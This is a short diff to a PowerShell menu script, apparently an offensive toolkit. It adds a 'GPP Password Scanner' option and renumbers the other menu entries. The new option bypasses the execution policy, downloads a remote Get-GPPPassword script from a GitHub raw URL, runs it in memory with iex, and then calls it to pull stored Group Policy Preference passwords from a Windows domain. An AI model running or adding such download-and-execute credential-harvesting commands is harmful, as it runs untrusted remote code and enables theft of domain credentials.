@@ -145,13 +145,21 @@ function global:prompt {
         }
     }
 
-  
     7 = @{
+        Name    = "GPP Password Scanner"
+        Command = {
+        powershell -NoExit -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/Girism/refs/heads/main/Get-GPPPassword.ps1'));Get-GPPPassword"
+        }
+    }
+
+
+  
+    8 = @{
         Name    = "Show Obfuscation Info"
         Command = $null
     }
   
-    8 = @{
+    9 = @{
         Name    = "Exit"
         Command = $null
     }
@@ -282,7 +290,7 @@ function global:prompt {
 
         # Validate input
         if ($choice -match '^\d+$' -and $menuOptions.ContainsKey([int]$choice)) {
-            if ($choice -eq 8) {
+            if ($choice -eq 9) {
                 Clear-Host
                 Show-Header
                 Write-Host "┌─ GOODBYE ───────────────────────────────────────────────────────────────────┐" -ForegroundColor "Magenta"
@@ -293,7 +301,7 @@ function global:prompt {
                 break
             }
 
-            if ($choice -eq 7) {
+            if ($choice -eq 8) {
                 Show-ObfuscationInfo
                 continue
             }
